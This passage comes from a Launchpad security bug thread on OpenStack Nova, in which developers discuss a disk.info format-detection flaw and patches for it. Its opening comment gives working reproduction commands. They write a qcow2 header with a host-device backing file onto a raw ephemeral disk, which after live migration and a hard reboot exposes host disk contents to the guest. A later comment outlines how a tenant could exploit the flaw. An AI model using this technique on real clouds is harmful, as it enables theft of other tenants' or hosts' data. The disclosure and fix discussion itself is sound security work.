vda    252:0    0   5G  0 disk<br />
└─vda1 252:1    0   5G  0 part /<br />
vdb    252:16   0   1G  0 disk</p>
<p>root@guest # qemu-img info /dev/vdb<br />
image: /dev/vdb<br />
file format: qcow2<br />
virtual size: 20G (21474836480 bytes)<br />
disk size: 0<br />
cluster_size: 65536<br />
backing file: /dev/sda3<br />
backing file format: raw<br />
Format specific information:<br />
&nbsp;&nbsp;&nbsp;&nbsp;compat: 1.1<br />
&nbsp;&nbsp;&nbsp;&nbsp;lazy refcounts: false<br />
&nbsp;&nbsp;&nbsp;&nbsp;refcount bits: 16<br />
&nbsp;&nbsp;&nbsp;&nbsp;corrupt: false</p>
<p># nova live-migration --block-migrate test-live-migrate</p>
<p>root@destination # ps aux | grep qemu<br />
qemu     17656 10.6  3.3 1236024 262832 ?      Sl   09:20   0:09 /usr/libexec/<wbr />qemu-kvm -name instance-00000009 [..] -device virtio-<wbr />blk-pci,<wbr />scsi=off,<wbr />bus=pci.<wbr />0,addr=<wbr />0x4,drive=<wbr />drive-virtio-<wbr />disk0,id=<wbr />virtio-<wbr />disk0,bootindex<wbr />=1 -drive file=/var/<wbr />lib/nova/<wbr />instances/<wbr />d7166c75-<wbr />7561-4788-<wbr />9bc0-481eee7808<wbr />2f/disk.<wbr />eph0,if=<wbr />none,id=<wbr />drive-virtio-<wbr />disk1,format=<wbr />raw,cache=<wbr />none [..]</p>
<p>root@destination # cat /var/lib/<wbr />nova/instances/<wbr />d7166c75-<wbr />7561-4788-<wbr />9bc0-481eee7808<wbr />2f/disk.<wbr />info<br />
{&quot;/var/<wbr />lib/nova/<wbr />instances/<wbr />d7166c75-<wbr />7561-4788-<wbr />9bc0-481eee7808<wbr />2f/disk&quot;<wbr />: &quot;raw&quot;, &quot;/var/lib/<wbr />nova/instances/<wbr />d7166c75-<wbr />7561-4788-<wbr />9bc0-481eee7808<wbr />2f/disk.<wbr />eph0&quot;: &quot;qcow2&quot;}</p>
<p># nova reboot --hard test-live-migrate</p>
<p>root@destination # ps aux | grep qemu<br />
qemu     18684  101  4.1 1209396 326928 ?      Sl   09:23   0:11 /usr/libexec/<wbr />qemu-kvm -name instance-00000009 [..] -device virtio-<wbr />blk-pci,<wbr />scsi=off,<wbr />bus=pci.<wbr />0,addr=<wbr />0x4,drive=<wbr />drive-virtio-<wbr />disk0,id=<wbr />virtio-<wbr />disk0,bootindex<wbr />=1 -drive file=/var/<wbr />lib/nova/<wbr />instances/<wbr />d7166c75-<wbr />7561-4788-<wbr />9bc0-481eee7808<wbr />2f/disk.<wbr />eph0,if=<wbr />none,id=<wbr />drive-virtio-<wbr />disk1,format=<wbr />qcow2,cache=<wbr />none [..]</p>
<p>root@guest # lsblk<br />
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT<br />
vda    252:0    0   5G  0 disk<br />
└─vda1 252:1    0   5G  0 part /<br />
vdb    252:16   0  20G  0 disk /mnt</p>
<p>root@guest # ll /mnt/etc/<wbr />redhat-<wbr />release<br />
-rw-r--r--. 1 root root 52 Oct 23 13:25 /mnt/etc/<wbr />redhat-<wbr />release</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've reproduced this case where a qcow2 header is written to the raw ephemeral on the source host before it and any associated storage is then live migrated. In this case disk.info is regenerated on the destination. After a hard reboot the instance then uses the ephemeral disk as if it were a qcow2 file. Again, my notes on this are below :

root@source # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info 
{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "raw"}

root@guest # lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda    252:0    0   5G  0 disk 
└─vda1 252:1    0   5G  0 part /
vdb    252:16   0   1G  0 disk /mnt

root@guest # umount /mnt

root@guest # qemu-img create -f qcow2 -o backing_file=/dev/sda3,backing_fmt=raw /dev/vdb 20G
Formatting '/dev/vdb', fmt=qcow2 size=21474836480 backing_file='/dev/sda3' backing_fmt='raw' encryption=off cluster_size=65536 lazy_refcounts=off refcount_bits=16
[root@test-live-migrate ~]# lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda    252:0    0   5G  0 disk 
└─vda1 252:1    0   5G  0 part /
vdb    252:16   0   1G  0 disk 

root@guest # qemu-img info /dev/vdb 
image: /dev/vdb
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 0
cluster_size: 65536
backing file: /dev/sda3
backing file format: raw
Format specific information:
    compat: 1.1
    lazy refcounts: false
    refcount bits: 16
    corrupt: false

# nova live-migration --block-migrate test-live-migrate

root@destination # ps aux | grep qemu
qemu     17656 10.6  3.3 1236024 262832 ?      Sl   09:20   0:09 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none [..]

root@destination # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info 
{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "qcow2"}

# nova reboot --hard test-live-migrate

root@destination # ps aux | grep qemu
qemu     18684  101  4.1 1209396 326928 ?      Sl   09:23   0:11 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none [..]


root@guest # lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda    252:0    0   5G  0 disk 
└─vda1 252:1    0   5G  0 part /
vdb    252:16   0  20G  0 disk /mnt

root@guest # ll /mnt/etc/redhat-release 
-rw-r--r--. 1 root root 52 Oct 23 13:25 /mnt/etc/redhat-release

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-24T20:52:43.827250+00:00" title="2016-02-24 20:52:43 UTC">on 2016-02-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The impact for live migration is a bit different since this action is not authorized (by default) for regular user. The exploitation would need another bug to force the migration...</p>
<p>Lee, any chance you try the hard-reboot case as described in comment #13 ?</p>
<p>To sum-up, the disk info needs to be copied in pre_live_migration, migrate_<wbr />disk_and_<wbr />power_off  and _hard_reboot (instead of being introspected). Is this something safe to implement all the way down to Kilo ?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The impact for live migration is a bit different since this action is not authorized (by default) for regular user. The exploitation would need another bug to force the migration...

Lee, any chance you try the hard-reboot case as described in comment #13 ?

To sum-up, the disk info needs to be copied in pre_live_migration, migrate_disk_and_power_off  and _hard_reboot (instead of being introspected). Is this something safe to implement all the way down to Kilo ?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~berrange" class="sprite person">Daniel Berrange (berrange)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T08:57:05.178886+00:00" title="2016-02-25 08:57:05 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>We don&#x27;t need to copy disk.info during live migration. The libvirt XML contains the authoritative information about the disk format during live migration. The destination host simply needs to re-generate disk.info based on the disk format listed in the XML of the incoming VM.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">We don't need to copy disk.info during live migration. The libvirt XML contains the authoritative information about the disk format during live migration. The destination host simply needs to re-generate disk.info based on the disk format listed in the XML of the incoming VM. </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T10:22:24.787706+00:00" title="2016-02-25 10:22:24 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Lee has a patch which reconstructs it from the confusingly similar disk_info, which amounts to the same thing. There are other reasons I want to copy disk.info in preference to this approach, but they&#x27;re not relevant here and fixing this issue takes precedence. Hopefully Lee&#x27;s patch will be ready for sharing later today.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Lee has a patch which reconstructs it from the confusingly similar disk_info, which amounts to the same thing. There are other reasons I want to copy disk.info in preference to this approach, but they're not relevant here and fixing this issue takes precedence. Hopefully Lee's patch will be ready for sharing later today.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T13:39:31.844908+00:00" title="2016-02-25 13:39:31 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Tristan, just to be clear the --hard reboot case described in c#13 is _after_ a live migration where the disk.info has been incorrectly recreated on the destination by the Raw imagebackend inspecting the disks. A standalone --hard reboot does not remove this file and so the Raw imagebackend does not recreate it incorrectly. Attaching my current patch to this LP now, still requires more extensive testing so feedback is very welcome.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Tristan, just to be clear the --hard reboot case described in c#13 is _after_ a live migration where the disk.info has been incorrectly recreated on the destination by the Raw imagebackend inspecting the disks. A standalone --hard reboot does not remove this file and so the Raw imagebackend does not recreate it incorrectly. Attaching my current patch to this LP now, still requires more extensive testing so feedback is very welcome.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T13:53:45.836591+00:00" title="2016-02-25 13:53:45 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thank for the quick patch, I&#x27;m currently setting up rdo-kilo and devstack-liberty environment to reproduce and test the fix.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thank for the quick patch, I'm currently setting up rdo-kilo and devstack-liberty environment to reproduce and test the fix.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T15:11:30.509992+00:00" title="2016-02-25 15:11:30 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On the topic of live-migrate being an admin issue, the bug remains after a live-migrate until the instance is recreated. This means that if the user believes that a live-migration has occurred on their instance, they can then create the malicious qcow2 and initiate the reboot afterwards. They might detect this directly from the performance impact on the guest.</p>
<p>Alternatively, they might create the malicious header, and then setup a job to automatically reboot the instance from time to time and test if data leakage has occurred. If the operator ever live migrates the guest, this will eventually succeed.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On the topic of live-migrate being an admin issue, the bug remains after a live-migrate until the instance is recreated. This means that if the user believes that a live-migration has occurred on their instance, they can then create the malicious qcow2 and initiate the reboot afterwards. They might detect this directly from the performance impact on the guest.

Alternatively, they might create the malicious header, and then setup a job to automatically reboot the instance from time to time and test if data leakage has occurred. If the operator ever live migrates the guest, this will eventually succeed.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T17:09:58.053244+00:00" title="2016-02-25 17:09:58 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m good with the live migrate case of this. Obviously this code all needs to be cleaned up and unified, but...</p>
<p>Talking to Lee in the back channel, it sounds like the cold case might be copying the file over top of itself if we&#x27;re on shared storage, which would be a bad idea. So I think he needs to make a change to fix that.</p>
<p>In general, I hate the idea of copying this file between the compute nodes because it becomes an issue for us potentially evolving the content/format of that file, and then copying a new-format file to an older compute node which can&#x27;t understand it. However, I think we probably already have that case if we&#x27;re on shared storage, where the file lives in a shared-by-both location. That&#x27;s a time bomb waiting to go off, but we&#x27;ll just have to deal with it when it happens I guess.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm good with the live migrate case of this. Obviously this code all needs to be cleaned up and unified, but...

Talking to Lee in the back channel, it sounds like the cold case might be copying the file over top of itself if we're on shared storage, which would be a bad idea. So I think he needs to make a change to fix that.

In general, I hate the idea of copying this file between the compute nodes because it becomes an issue for us potentially evolving the content/format of that file, and then copying a new-format file to an older compute node which can't understand it. However, I think we probably already have that case if we're on shared storage, where the file lives in a shared-by-both location. That's a time bomb waiting to go off, but we'll just have to deal with it when it happens I guess.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/22" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T17:17:49.180426+00:00" title="2016-02-25 17:17:49 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/22"> #22</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Apologies for the confusion Dan, the cold case doesn&#x27;t overwrite the disk.info file as we&#x27;ve moved the inst_base to inst_base + &#x27;_resize&#x27; before copying only the images back into inst_base. inst_base itself is either recreated locally for shared storage or remotely for non-shared storage, either way disk.info doesn&#x27;t exist in the new directory.  Again apologies for the confusion.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Apologies for the confusion Dan, the cold case doesn't overwrite the disk.info file as we've moved the inst_base to inst_base + '_resize' before copying only the images back into inst_base. inst_base itself is either recreated locally for shared storage or remotely for non-shared storage, either way disk.info doesn't exist in the new directory.  Again apologies for the confusion.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/23" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sdague" class="sprite person">Sean Dague (sdague)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T17:24:22.179910+00:00" title="2016-02-25 17:24:22 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/23"> #23</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>It seems like backing_file can never be trusted from qemu info. Even if we spot fix the issue today, something else will slip in later that uses it, and we&#x27;ll do this drill all over again.</p>
<p>How hard would it be to cut off that case entirely?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">It seems like backing_file can never be trusted from qemu info. Even if we spot fix the issue today, something else will slip in later that uses it, and we'll do this drill all over again.

How hard would it be to cut off that case entirely?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~alaski" class="sprite person">Andrew Laski (alaski)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-25T17:46:30.444370+00:00" title="2016-02-25 17:46:30 UTC">on 2016-02-25</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I have not tested the patch but it looks fine to me from a pure review POV and it should address some of these cases. I think Sean makes a great point that this is just addressing another symptom rather than treating the disease. So while I&#x27;m fine moving forward with this patch after some testing has been done I would rather see a more robust approach as well.</p>
<p>I also agree with Dan that recreating the file would be a better approach than copying it. We lock ourselves into the current format if it&#x27;s copied around.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I have not tested the patch but it looks fine to me from a pure review POV and it should address some of these cases. I think Sean makes a great point that this is just addressing another symptom rather than treating the disease. So while I'm fine moving forward with this patch after some testing has been done I would rather see a more robust approach as well.

I also agree with Dan that recreating the file would be a better approach than copying it. We lock ourselves into the current format if it's copied around.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
